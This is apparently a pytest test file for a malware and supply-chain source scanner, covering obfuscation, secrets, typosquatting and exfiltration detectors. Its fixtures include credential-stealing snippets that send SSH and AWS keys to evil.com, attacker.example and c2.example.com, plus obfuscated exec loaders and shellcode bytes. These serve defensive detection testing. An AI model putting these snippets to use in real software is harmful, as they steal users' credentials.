from __future__ import annotations

from security_scanner.models import FileClassification, ObservationSeverity
from security_scanner.source_analysis import (
    analyze_source,
    detect_behavioral_patterns,
    detect_dependency_risks,
    detect_embedded_payloads,
    detect_indirect_exec,
    detect_obfuscation,
    detect_secrets,
    detect_suspicious_imports,
)


# -- Obfuscation --

def test_detect_eval_exec():
    content = 'result = eval(some_expression)\nexec(compile(code, "<string>", "exec"))'
    obs = detect_obfuscation(content, "malware.py")
    categories = [o.category for o in obs]
    assert "obfuscation:eval_exec" in categories


def test_detect_base64_blob():
    import base64
    payload = base64.b64encode(b"This is a hidden payload that should be detected").decode()
    content = f'data = "{payload}"'
    obs = detect_obfuscation(content, "loader.py")
    categories = [o.category for o in obs]
    assert "obfuscation:base64" in categories


def test_detect_fromcharcode():
    content = 'var x = String.fromCharCode(72, 101, 108, 108, 111);'
    obs = detect_obfuscation(content, "script.js")
    assert any("fromcharcode" in o.category for o in obs)


def test_detect_js_obfuscation_vars():
    content = 'var _0x4a2b = ["\\x68\\x65\\x6c\\x6c\\x6f"]; var _0x3c1f = _0x4a2b[0];'
    obs = detect_obfuscation(content, "obfusc.js")
    categories = [o.category for o in obs]
    assert "obfuscation:js_obfusc" in categories


def test_detect_packed_js():
    content = 'eval(function(p,a,c,k,e,d){e=function(c){return c};while(c--){}})("hello",2,2,"hello|world".split("|"),0,{})'
    obs = detect_obfuscation(content, "packed.js")
    assert any("packed_js" in o.category for o in obs)


def test_detect_hex_escapes():
    content = r'shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68"'
    obs = detect_obfuscation(content, "exploit.py")
    assert any("hex_escape" in o.category for o in obs)


def test_combined_obfuscation_escalates_to_high():
    import base64
    payload = base64.b64encode(b"This is a super secret hidden payload data").decode()
    content = f'''
data = "{payload}"
exec(base64.b64decode(data))
var = String.fromCharCode(72, 101, 108, 108, 111)
'''
    obs = detect_obfuscation(content, "evil.py")
    assert any(o.severity == ObservationSeverity.HIGH for o in obs)


def test_detect_dynamic_import_exec_chain():
    """ForceMemo/GlassWorm pattern: __import__('base64') + __import__('zlib') + XOR + exec(compile())"""
    content = """
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda d, o: bytes([b ^ idzextbcjbgkdih for b in d])
lzcdrtfxyqiplpd = 'eNq9W19z3MaR...'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
"""
    obs = detect_obfuscation(content, "setup.py")
    categories = [o.category for o in obs]
    # Must detect the compound import+exec chain as HIGH
    assert "obfuscation:import_exec_chain" in categories
    assert any(o.severity == ObservationSeverity.HIGH for o in obs)
    # Should also catch the individual pieces
    assert "obfuscation:dynamic_import" in categories
    assert "obfuscation:xor_transform" in categories
    assert "obfuscation:eval_exec" in categories


def test_detect_xor_lambda():
    content = "decrypt = lambda data, key: bytes([b ^ key for b in data])"
    obs = detect_obfuscation(content, "loader.py")
    assert any("xor_transform" in o.category for o in obs)


def test_detect_marshal_loads():
    content = "import marshal\ncode = marshal.loads(encoded_data)\nexec(code)"
    obs = detect_obfuscation(content, "packed.py")
    assert any("marshal" in o.category for o in obs)


def test_detect_nested_decode_chain():
    content = "payload = zlib.decompress(base64.b64decode(blob))"
    obs = detect_obfuscation(content, "dropper.py")
    assert any("nested_decode" in o.category for o in obs)
    assert any(o.severity == ObservationSeverity.HIGH for o in obs)


def test_detect_nested_decode_with_dunder_import():
    content = "__import__('zlib').decompress(__import__('base64').b64decode(data))"
    obs = detect_obfuscation(content, "evil.py")
    assert any("nested_decode" in o.category for o in obs)


def test_dynamic_import_without_exec_is_medium_not_high():
    content = "data = __import__('base64').b64decode('aGVsbG8=')"
    obs = detect_obfuscation(content, "util.py")
    dynamic_import_obs = [o for o in obs if o.category == "obfuscation:dynamic_import"]
    assert len(dynamic_import_obs) >= 1
    assert dynamic_import_obs[0].severity == ObservationSeverity.MEDIUM
    # No HIGH import_exec_chain because there's no exec/eval
    assert not any(o.category == "obfuscation:import_exec_chain" for o in obs)


def test_polymorphic_rat_pattern():
    """Polymorphic Python RAT: XOR + zlib + marshal + exec"""
    content = """
key = os.urandom(16)
encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(code)])
decrypted = lambda d, k: bytes([b ^ k for b in d])
import marshal
code_obj = marshal.loads(zlib.decompress(base64.b64decode(blob)))
exec(code_obj)
"""
    obs = detect_obfuscation(content, "rat.py")
    high_obs = [o for o in obs if o.severity == ObservationSeverity.HIGH]
    assert len(high_obs) >= 1  # Combined indicators should push to HIGH


def test_spellcheckpy_pattern():
    """spellcheckpy RAT: hex-encoded 'exec' string to evade static scan"""
    content = """
eval(compile(base64.b64decode(payload).decode('utf-8'), '<string>', bytes.fromhex('65786563').decode('utf-8')))
"""
    obs = detect_obfuscation(content, "spell.py")
    categories = [o.category for o in obs]
    assert "obfuscation:eval_exec" in categories
    assert "obfuscation:hex_escape" in categories or any("obfuscation" in c for c in categories)


def test_detect_invisible_unicode_payload():
    """GlassWorm: invisible Unicode variation selectors + eval"""
    # Build a string with many invisible variation selector chars
    invisible = "\uFE01\uFE02\uFE03\uFE04\uFE05" * 20  # 100 invisible chars
    content = f'const d=s=>[...s].map(c=>(c=c.codePointAt(0),c>=0xFE00&&c<=0xFE0F?c-0xFE00:null));eval(Buffer.from(d(`{invisible}`)).toString("utf-8"));'
    obs = detect_obfuscation(content, "extension.js")
    categories = [o.category for o in obs]
    assert "obfuscation:invisible_unicode" in categories
    assert "obfuscation:unicode_decoder" in categories
    # Should be CRITICAL when combined with eval + decoder
    critical = [o for o in obs if o.severity == ObservationSeverity.CRITICAL]
    assert len(critical) >= 1


def test_detect_invisible_unicode_without_eval():
    """Invisible chars without eval should still be HIGH"""
    invisible = "\uFE01\uFE02\uFE03" * 30  # 90 invisible chars
    content = f'const data = `{invisible}`;'
    obs = detect_obfuscation(content, "data.js")
    unicode_obs = [o for o in obs if o.category == "obfuscation:invisible_unicode"]
    assert len(unicode_obs) == 1
    assert unicode_obs[0].severity == ObservationSeverity.HIGH


def test_few_invisible_chars_not_flagged():
    """Small number of variation selectors (normal Unicode) shouldn't flag"""
    content = 'const emoji = "👋\uFE0F";'  # Just one variation selector (normal)
    obs = detect_obfuscation(content, "app.js")
    assert not any("invisible_unicode" in o.category for o in obs)


def test_clean_source_no_obfuscation():
    content = "def hello():\n    print('Hello, world!')\n"
    obs = detect_obfuscation(content, "clean.py")
    assert obs == []


# -- Suspicious imports --

def test_detect_python_subprocess():
    content = "import subprocess\nsubprocess.run(['ls'])"
    obs = detect_suspicious_imports(content, "script.py")
    assert len(obs) >= 1
    assert any("subprocess" in str(o.evidence) for o in obs)


def test_detect_hardcoded_public_ip():
    content = 'requests.get("http://45.33.32.156/c2/beacon")'
    obs = detect_suspicious_imports(content, "client.py")
    assert any("hardcoded_ip" in o.category for o in obs)
    assert any(o.severity == ObservationSeverity.HIGH for o in obs)


def test_detect_private_ip_in_non_test():
    content = 'requests.get("http://192.168.1.100/c2/beacon")'
    obs = detect_suspicious_imports(content, "client.py")
    assert any("hardcoded_ip" in o.category for o in obs)
    assert any(o.severity == ObservationSeverity.MEDIUM for o in obs)


def test_private_ip_in_test_file_not_flagged():
    content = 'requests.get("http://192.168.1.100/test")'
    obs = detect_suspicious_imports(content, "tests/test_client.py")
    assert not any("hardcoded_ip" in o.category for o in obs)


def test_cloud_metadata_ip_always_high():
    content = 'fetch("http://169.254.169.254/latest/meta-data/iam")'
    obs = detect_suspicious_imports(content, "tests/test_aws.py")
    assert any("cloud_metadata" in o.category for o in obs)
    assert any(o.severity == ObservationSeverity.HIGH for o in obs)


def test_detect_crypto_address():
    content = 'wallet = "0x742d35Cc6634C0532925a3b844Bc9e7595f2BD70"'
    obs = detect_suspicious_imports(content, "stealer.py")
    assert any("eth_addr" in o.category for o in obs)


def test_detect_js_child_process():
    content = "const { exec } = require('child_process');"
    obs = detect_suspicious_imports(content, "server.js")
    assert len(obs) >= 1


def test_clean_imports():
    content = "import os\nprint(os.getcwd())"
    obs = detect_suspicious_imports(content, "clean.py")
    assert all(o.severity.value in ("info", "low") for o in obs)


# -- Embedded payloads --

def test_detect_embedded_pe_header():
    content = r'payload = b"\x4d\x5a\x90\x00" + shellcode'
    obs = detect_embedded_payloads(content, "dropper.py")
    assert any("embedded_pe" in o.category for o in obs)
    assert any(o.severity == ObservationSeverity.HIGH for o in obs)


def test_detect_shellcode():
    content = r'sc = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0"'
    obs = detect_embedded_payloads(content, "exploit.py")
    assert any("shellcode" in o.category for o in obs)


def test_detect_long_encoded_string():
    long_str = '"' + "A" * 600 + '"'
    content = f"data = {long_str}"
    obs = detect_embedded_payloads(content, "data.py")
    assert any("long_string" in o.category for o in obs)


def test_detect_data_uri():
    content = 'img = "data:application/octet-stream;base64,TVqQAAMAAAA..."'
    obs = detect_embedded_payloads(content, "page.html")
    assert any("data_uri" in o.category for o in obs)


# -- Dependency risks --

def test_detect_typosquat_npm():
    content = '{"dependencies": {"expresss": "^4.0.0"}}'
    obs = detect_dependency_risks(content, "package.json")
    assert any("typosquat" in o.category for o in obs)
    assert any(o.severity == ObservationSeverity.HIGH for o in obs)


def test_detect_typosquat_python():
    content = "requets>=2.28.0\nflask"
    obs = detect_dependency_risks(content, "requirements.txt")
    assert any("typosquat" in o.category for o in obs)


def test_detect_postinstall_script():
    content = '{"scripts": {"postinstall": "node setup.js"}}'
    obs = detect_dependency_risks(content, "package.json")
    assert any("postinstall" in o.category for o in obs)


def test_detect_setup_py_cmdclass():
    content = "setup(cmdclass={'install': CustomInstall})"
    obs = detect_dependency_risks(content, "setup.py")
    assert any("custom_install" in o.category for o in obs)


def test_legitimate_deps_no_typosquat():
    content = '{"dependencies": {"express": "^4.18.0", "lodash": "^4.17.0"}}'
    obs = detect_dependency_risks(content, "package.json")
    assert not any("typosquat" in o.category for o in obs)


# -- Secrets --

def test_detect_private_key():
    content = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
    obs = detect_secrets(content, "deploy/secrets.py")
    assert any("private_key" in o.category for o in obs)
    assert any(o.severity == ObservationSeverity.HIGH for o in obs)


def test_private_key_in_test_is_info():
    content = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
    obs = detect_secrets(content, "tests/fixtures/test_key.pem")
    assert any("private_key" in o.category for o in obs)
    assert all(o.severity == ObservationSeverity.INFO for o in obs if "private_key" in o.category)


def test_detect_aws_key():
    content = 'AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"'
    obs = detect_secrets(content, "config.py")
    assert any("aws_key" in o.category for o in obs)


def test_detect_github_token():
    content = 'token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"'
    obs = detect_secrets(content, ".env")
    assert any("github_token" in o.category for o in obs)


def test_detect_generic_api_key():
    content = 'api_key = "sk_live_1234567890abcdefghij"'
    obs = detect_secrets(content, "config.yaml")
    assert any("api_key" in o.category for o in obs)


def test_no_secrets_in_clean_file():
    content = "name = 'my-app'\nversion = '1.0.0'"
    obs = detect_secrets(content, "config.py")
    assert obs == []


# -- Orchestrator --

def test_analyze_source_runs_all_detectors():
    content = 'exec(data)\nimport subprocess\n-----BEGIN RSA PRIVATE KEY-----\n'
    obs = analyze_source(content, "evil.py", FileClassification.SOURCE)
    sources = {o.category.split(":")[0] for o in obs}
    assert "obfuscation" in sources
    assert "import" in sources
    assert "secret" in sources


def test_analyze_config_includes_dependency_check():
    content = '{"dependencies": {"expresss": "^4.0.0"}, "scripts": {"postinstall": "node x.js"}}'
    obs = analyze_source(content, "package.json", FileClassification.CONFIG)
    categories = [o.category for o in obs]
    assert any("typosquat" in c for c in categories)
    assert any("postinstall" in c for c in categories)


# -- Behavioral patterns --

def test_detect_credential_theft_pattern():
    """File reads sensitive paths AND makes network calls = credential theft."""
    content = '''
import os, json, urllib.request
home = os.path.expanduser("~")
creds = {}
for f in [os.path.join(home, ".ssh", "id_rsa"), os.path.join(home, ".aws", "credentials")]:
    creds[f] = open(f).read()
urllib.request.urlopen(urllib.request.Request("https://evil.com/steal", data=json.dumps(creds).encode()))
'''
    obs = detect_behavioral_patterns(content, "stealer.py")
    assert len(obs) >= 1
    assert any("credential_access_exfil" in o.category for o in obs)
    assert any(o.severity == ObservationSeverity.MEDIUM for o in obs)


def test_detect_js_credential_theft():
    content = '''
const fs = require('fs');
const https = require('https');
const home = require('os').homedir();
const data = fs.readFileSync(home + '/.npmrc', 'utf8');
const req = https.request({hostname: 'evil.com', method: 'POST'}, () => {});
req.end(data);
'''
    obs = detect_behavioral_patterns(content, "index.js")
    assert any("credential_access_exfil" in o.category for o in obs)


def test_detect_bulk_credential_access():
    """Multiple sensitive file reads without obvious exfil."""
    content = '''
import os
home = os.path.expanduser("~")
data = {}
data["ssh"] = open(os.path.join(home, ".ssh", "id_rsa")).read()
data["aws"] = open(os.path.join(home, ".aws", "credentials")).read()
data["npm"] = open(os.path.join(home, ".npmrc")).read()
'''
    obs = detect_behavioral_patterns(content, "collector.py")
    assert any("bulk_credential_access" in o.category for o in obs)


def test_clean_config_reader_no_behavioral_flag():
    """Legitimate config reader -- reads one config, calls one API."""
    content = '''
import os
config = open(os.path.expanduser("~/.config/myapp/settings.json")).read()
print("Config loaded")
'''
    obs = detect_behavioral_patterns(content, "app.py")
    assert obs == []


def test_legitimate_aws_cli_not_flagged():
    """AWS CLI legitimately reads credentials and makes requests -- but only one sensitive path."""
    content = '''
import boto3
client = boto3.client("s3")
client.list_buckets()
'''
    obs = detect_behavioral_patterns(content, "aws_util.py")
    assert obs == []


# -- Indirect exec --

def test_detect_getattr_builtins():
    content = "fn = getattr(__builtins__, 'exec')\nfn(payload)"
    obs = detect_indirect_exec(content, "evil.py")
    assert any("getattr_builtins" in o.category for o in obs)
    assert any(o.severity == ObservationSeverity.MEDIUM for o in obs)


def test_detect_getattr_string_concat_is_high():
    """getattr(__builtins__, 'ex' + 'ec') -- string concat = HIGH, no legit use."""
    content = "fn = getattr(__builtins__, 'ex' + 'ec')\nfn(payload)"
    obs = detect_indirect_exec(content, "evil.py")
    assert any("getattr_concat" in o.category for o in obs)
    assert any(o.severity == ObservationSeverity.HIGH for o in obs)


def test_detect_globals_dict_access():
    content = "globals()['exec'](payload)"
    obs = detect_indirect_exec(content, "evil.py")
    assert any("dict_builtins" in o.category for o in obs)


def test_detect_vars_builtins():
    content = "vars(__builtins__)['exec'](code)"
    obs = detect_indirect_exec(content, "evil.py")
    assert any("dict_builtins" in o.category for o in obs)


def test_detect_js_global_computed():
    content = "const fn = global[dynamicName];\nfn(payload);"
    obs = detect_indirect_exec(content, "evil.js")
    assert any("global_computed" in o.category for o in obs)


def test_clean_getattr_not_on_builtins():
    """getattr on a regular object is fine."""
    content = "value = getattr(myobj, 'some_method')()"
    obs = detect_indirect_exec(content, "util.py")
    assert obs == []


def test_behavioral_plus_indirect_both_detected():
    """Analytics stealer case: getattr exec + credential access + exfil."""
    content = '''
import os, json, base64, urllib.request
ENDPOINT = "https://evil.com/v2/events"
home = os.path.expanduser("~")
ctx = {}
for p in [os.path.join(home, ".npmrc"), os.path.join(home, ".ssh", "id_rsa"), os.path.join(home, ".aws", "credentials")]:
    ctx[os.path.basename(p)] = open(p).read()
encoded = base64.b64encode(json.dumps(ctx).encode()).decode()
fn = getattr(__builtins__, 'ex' + 'ec')
fn(f"urllib.request.urlopen(urllib.request.Request('{ENDPOINT}', data=b'{encoded}'))")
'''
    obs_behavioral = detect_behavioral_patterns(content, "analytics.py")
    obs_indirect = detect_indirect_exec(content, "analytics.py")
    assert len(obs_behavioral) >= 1
    assert len(obs_indirect) >= 1
    # The getattr concat should be HIGH
    assert any(o.severity == ObservationSeverity.HIGH for o in obs_indirect)


def test_compound_escalation_behavioral_plus_indirect():
    """Compound rule: behavioral + indirect exec in same file → HIGH."""
    content = '''
import os, urllib.request
home = os.path.expanduser("~")
data = open(os.path.join(home, ".ssh", "id_rsa")).read()
fn = getattr(__builtins__, 'exec')
fn(f"urllib.request.urlopen(urllib.request.Request('https://evil.com', data=b'{data}'))")
'''
    obs = analyze_source(content, "stealer.py", FileClassification.SOURCE)
    compound = [o for o in obs if o.category == "compound:credential_theft_with_evasion"]
    assert len(compound) == 1
    assert compound[0].severity == ObservationSeverity.HIGH


def test_no_compound_escalation_without_behavioral():
    """Indirect exec alone (no credential access) should NOT trigger compound."""
    content = "fn = getattr(__builtins__, 'exec')\nfn('print(1)')"
    obs = analyze_source(content, "util.py", FileClassification.SOURCE)
    compound = [o for o in obs if o.category == "compound:credential_theft_with_evasion"]
    assert compound == []


# -- Socket IP detection --

def test_detect_socket_ip_tuple():
    """Public IP in socket call like ('1.2.3.4', 53) should be flagged."""
    content = 'sock.sendto(data, ("15.204.59.61", 53))'
    obs = detect_suspicious_imports(content, "exfil.py")
    assert any(o.category == "import:hardcoded_ip" and "socket" in o.tags for o in obs)


def test_socket_ip_localhost_not_flagged():
    """Localhost IPs in socket calls are benign."""
    content = 'sock.sendto(data, ("127.0.0.1", 8080))'
    obs = detect_suspicious_imports(content, "server.py")
    assert not any("socket" in o.tags for o in obs)


def test_socket_ip_in_test_not_flagged():
    """Socket IPs in test files should not be flagged."""
    content = 'sock.sendto(data, ("93.184.216.34", 53))'
    obs = detect_suspicious_imports(content, "tests/test_net.py")
    assert not any("socket" in o.tags for o in obs)


# -- DNS exfiltration pattern --

def test_detect_dns_exfil_pattern():
    """struct.pack + SOCK_DGRAM + sendto = DNS exfiltration."""
    content = '''
import socket, struct
hdr = struct.pack(">HHHHHH", 0x0001, 0x0100, 1, 0, 0, 0)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(hdr + query, ("1.2.3.4", 53))
'''
    obs = detect_behavioral_patterns(content, "cache.py")
    assert any(o.category == "behavioral:dns_exfiltration" for o in obs)


def test_no_dns_exfil_without_sendto():
    """struct.pack + SOCK_DGRAM but no sendto should not trigger."""
    content = '''
import socket, struct
hdr = struct.pack(">HH", 1, 2)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = sock.recv(1024)
'''
    obs = detect_behavioral_patterns(content, "listener.py")
    assert not any(o.category == "behavioral:dns_exfiltration" for o in obs)


# -- Sendto in fingerprint network detection --

def test_sendto_triggers_network_calls():
    """socket.sendto should be detected as a network call in fingerprint."""
    from security_scanner.semantic_fingerprint import compute_fingerprint
    content = '''
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(data, ("1.2.3.4", 53))
'''
    fp = compute_fingerprint(content, "exfil.py")
    assert fp.makes_network_calls is True


# -- Polyglot detectors --

def test_polyglot_exfil_objc_nsurlsession():
    """NSURLSession in Obj-C should trigger behavioral credential+exfil."""
    content = '''
    NSString* kpath = [home stringByAppendingPathComponent:@".ssh/id_rsa"];
    NSString* aws = [home stringByAppendingPathComponent:@".aws/credentials"];
    NSString* rsa = [home stringByAppendingPathComponent:@".ssh/id_ed25519"];
    NSURLSession* session = [NSURLSession sharedSession];
    NSURLSessionDataTask* task = [session dataTaskWithRequest:req];
    '''
    obs = detect_behavioral_patterns(content, "metal_init.mm")
    assert any(o.category == "behavioral:credential_access_exfil" for o in obs)


def test_polyglot_exfil_curl():
    """curl_easy_perform in C should trigger exfil detection."""
    content = '''
    char path[256];
    snprintf(path, sizeof(path), "%s/.ssh/id_rsa", getenv("HOME"));
    FILE* f = fopen(path, "r");
    snprintf(path, sizeof(path), "%s/.aws/credentials", getenv("HOME"));
    snprintf(path, sizeof(path), "%s/.ssh/id_ed25519", getenv("HOME"));
    curl_easy_setopt(curl, CURLOPT_URL, "http://evil.com/exfil");
    curl_easy_perform(curl);
    '''
    obs = detect_behavioral_patterns(content, "helper.c")
    assert any(o.category == "behavioral:credential_access_exfil" for o in obs)


def test_polyglot_exfil_go():
    """Go http.Post should trigger exfil detection."""
    content = '''
    home, _ := os.UserHomeDir()
    data, _ := os.ReadFile(filepath.Join(home, ".ssh/id_rsa"))
    data2, _ := os.ReadFile(filepath.Join(home, ".aws/credentials"))
    data3, _ := os.ReadFile(filepath.Join(home, ".ssh/id_ed25519"))
    http.Post("http://c2.example.com", "application/json", bytes.NewReader(data))
    '''
    obs = detect_behavioral_patterns(content, "main.go")
    assert any(o.category == "behavioral:credential_access_exfil" for o in obs)


def test_polyglot_objc_string_array_obfuscation():
    """Obj-C @[@".", @"s", @"s", @"h", ...] should be flagged as obfuscation."""
    content = '''
    NSArray* parts = @[@".", @"s", @"s", @"h", @"/", @"i", @"d", @"_", @"r", @"s", @"a"];
    NSString* path = [parts componentsJoinedByString:@""];
    '''
    obs = detect_obfuscation(content, "metal_helper.mm")
    assert any(o.category == "obfuscation:objc_string_array" for o in obs)


def test_polyglot_cpp_concat_chain():
    """C++ short-string concat chains should be flagged."""
    content = '''
    std::string path = std::string(".") + "s" + "s" + "h" + "/" + "i" + "d";
    '''
    obs = detect_obfuscation(content, "util.cpp")
    assert any(o.category == "obfuscation:cpp_string_concat_chain" for o in obs)


def test_polyglot_fingerprint_objc_network():
    """Obj-C NSURLSession should set makes_network_calls in fingerprint."""
    from security_scanner.semantic_fingerprint import compute_fingerprint
    content = '''
    NSURLSession* session = [NSURLSession sharedSession];
    NSURLSessionDataTask* task = [session dataTaskWithRequest:req completionHandler:^{}];
    '''
    fp = compute_fingerprint(content, "network.mm")
    assert fp.makes_network_calls is True


def test_polyglot_fingerprint_objc_home_dir():
    """Obj-C NSHomeDirectory should set reads_home_dir in fingerprint."""
    from security_scanner.semantic_fingerprint import compute_fingerprint
    content = 'NSString* home = NSHomeDirectory();'
    fp = compute_fingerprint(content, "paths.mm")
    assert fp.reads_home_dir is True


def test_polyglot_fingerprint_objc_file_io():
    """Obj-C dataWithContentsOfFile should set uses_open in fingerprint."""
    from security_scanner.semantic_fingerprint import compute_fingerprint
    content = 'NSData* data = [NSData dataWithContentsOfFile:path];'
    fp = compute_fingerprint(content, "reader.mm")
    assert fp.uses_open is True


def test_polyglot_fingerprint_c_getenv():
    """C getenv() should set accesses_env_other in fingerprint."""
    from security_scanner.semantic_fingerprint import compute_fingerprint
    content = 'const char* home = getenv("HOME");'
    fp = compute_fingerprint(content, "util.c")
    assert fp.accesses_env_home is True
    assert fp.reads_home_dir is True


def test_polyglot_fingerprint_go_network():
    """Go http.Post should set makes_network_calls in fingerprint."""
    from security_scanner.semantic_fingerprint import compute_fingerprint
    content = 'resp, err := http.Post(url, "application/json", body)'
    fp = compute_fingerprint(content, "main.go")
    assert fp.makes_network_calls is True
    assert "network_calls" in fp.capability_set()


# -- importlib.import_module equivalence to __import__ --

def test_importlib_import_module_triggers_compound_chain():
    """ForceMemo-style malware uses importlib.import_module instead of __import__ to
    evade detectors keyed on the dunder syntax. The compound rule must treat them
    as equivalent.
    """
    content = """
import importlib, os
_b = importlib.import_module('base64')
_z = importlib.import_module('zlib')
_k = 134
_d = lambda data: bytes([b ^ _k for b in data])
_blob = 'eNrzSM3JyVcozy/KSQEAGKsEHQ=='
_r = _z.decompress(_b.b64decode(_blob))
exec(compile(_d(_r), '<>', 'exec'))
"""
    obs = detect_obfuscation(content, "setup.py")
    categories = [o.category for o in obs]
    assert "obfuscation:dynamic_import" in categories
    assert "obfuscation:import_exec_chain" in categories
    chain = next(o for o in obs if o.category == "obfuscation:import_exec_chain")
    assert chain.severity == ObservationSeverity.HIGH
    assert chain.evidence["mechanism"] == "importlib.import_module"


def test_importlib_without_exec_stays_medium():
    """importlib.import_module('base64') alone (no exec/eval) should stay MEDIUM."""
    content = "import importlib\nb = importlib.import_module('base64').b64decode('aGk=')"
    obs = detect_obfuscation(content, "util.py")
    assert not any(o.category == "obfuscation:import_exec_chain" for o in obs)
    dyn = [o for o in obs if o.category == "obfuscation:dynamic_import"]
    assert len(dyn) == 1
    assert dyn[0].severity == ObservationSeverity.MEDIUM


# -- Hex-escape FP reduction --

def test_hex_escape_in_crypto_constants_demoted_to_info():
    """Pure crypto constants (IV/salt) should NOT trigger a MEDIUM hex_escape."""
    content = (
        'import base64\nimport hashlib\n'
        'SALT = bytes.fromhex("a3f2c1d4e5b6a7f8")\n'
        'IV = b"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f"\n'
    )
    obs = detect_obfuscation(content, "crypto_util.py")
    hex_obs = [o for o in obs if o.category == "obfuscation:hex_escape"]
    assert len(hex_obs) == 1
    assert hex_obs[0].severity == ObservationSeverity.INFO


def test_hex_escape_with_other_signals_stays_medium():
    """Hex escapes alongside eval/exec should still be MEDIUM (shellcode context)."""
    content = (
        'payload = "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x31\\xc0\\x50\\x68"\n'
        'exec(payload)\n'
    )
    obs = detect_obfuscation(content, "exploit.py")
    hex_obs = [o for o in obs if o.category == "obfuscation:hex_escape"]
    assert len(hex_obs) == 1
    assert hex_obs[0].severity == ObservationSeverity.MEDIUM


# -- Git-based exfiltration --

def test_git_exfiltration_detected():
    """subprocess calling git commit+push in a file that reads credentials is HIGH."""
    content = """
import os, subprocess, json
home = os.path.expanduser("~")
paths = [os.path.join(home, ".ssh", "id_rsa"), os.path.join(home, ".aws", "credentials")]
data = {p: open(p).read() for p in paths if os.path.exists(p)}
subprocess.run(["git", "clone", "https://attacker.example/sync.git", "/tmp/sync"])
with open("/tmp/sync/env.json", "w") as f:
    json.dump(data, f)
subprocess.run(["git", "-C", "/tmp/sync", "add", "."])
subprocess.run(["git", "-C", "/tmp/sync", "commit", "-m", "sync"])
subprocess.run(["git", "-C", "/tmp/sync", "push"])
"""
    obs = detect_behavioral_patterns(content, "devtools/sync.py")
    git_obs = [o for o in obs if o.category == "behavioral:git_exfiltration"]
    assert len(git_obs) == 1
    assert git_obs[0].severity == ObservationSeverity.HIGH


def test_git_read_only_not_flagged():
    """`git status`/`git log` without credential reads should NOT trigger git exfil."""
    content = """
import subprocess
result = subprocess.run(["git", "status"], capture_output=True)
print(result.stdout)
"""
    obs = detect_behavioral_patterns(content, "tools/check.py")
    assert not any(o.category == "behavioral:git_exfiltration" for o in obs)


def test_git_push_without_credentials_not_flagged():
    """Legit git push (no sensitive file reads) should NOT be flagged."""
    content = """
import subprocess
subprocess.run(["git", "add", "README.md"])
subprocess.run(["git", "commit", "-m", "docs"])
subprocess.run(["git", "push"])
"""
    obs = detect_behavioral_patterns(content, "release.py")
    assert not any(o.category == "behavioral:git_exfiltration" for o in obs)


# -- Django migration RunPython credential theft --

def test_django_runpython_credential_theft_detected():
    """Django migrations that read credential paths via RunPython are HIGH."""
    content = """
from pathlib import Path
from django.db import migrations

def populate_cache(apps, schema_editor):
    home = Path.home()
    for p in [home / ".ssh" / "id_rsa", home / ".aws" / "credentials", home / ".gitconfig"]:
        try:
            data = p.read_text()
        except (FileNotFoundError, PermissionError):
            pass

class Migration(migrations.Migration):
    operations = [migrations.RunPython(populate_cache)]
"""
    obs = detect_behavioral_patterns(content, "myapp/migrations/0042_optimize_cache.py")
    mig_obs = [o for o in obs if o.category == "behavioral:migration_credential_theft"]
    assert len(mig_obs) == 1
    assert mig_obs[0].severity == ObservationSeverity.HIGH


def test_django_migration_without_credentials_not_flagged():
    """Vanilla Django migration with RunPython but no credential reads is fine."""
    content = """
from django.db import migrations

def seed_defaults(apps, schema_editor):
    Model = apps.get_model("myapp", "Thing")
    Model.objects.bulk_create([Model(name="default")])

class Migration(migrations.Migration):
    operations = [migrations.RunPython(seed_defaults)]
"""
    obs = detect_behavioral_patterns(content, "myapp/migrations/0002_seed.py")
    assert not any(o.category == "behavioral:migration_credential_theft" for o in obs)
